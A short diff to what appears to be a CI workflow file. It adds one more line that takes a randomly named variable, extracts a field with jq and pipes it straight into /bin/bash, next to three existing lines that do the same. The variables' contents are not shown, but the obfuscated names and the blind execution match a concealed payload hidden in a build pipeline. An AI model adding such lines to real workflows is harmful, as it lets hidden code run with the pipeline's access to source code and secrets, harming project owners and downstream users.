@@ -39,6 +39,7 @@ jobs:
           echo $nqlb47 | jq -r .gym83196 | /bin/bash
           printf '%s' "$d73455" | jq -r .xdvj73513 | /bin/bash
           printf '%s' "$opdb43" | jq -r .y64 | /bin/bash
+          printf '%s' "$km5748" | jq -r .d8 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
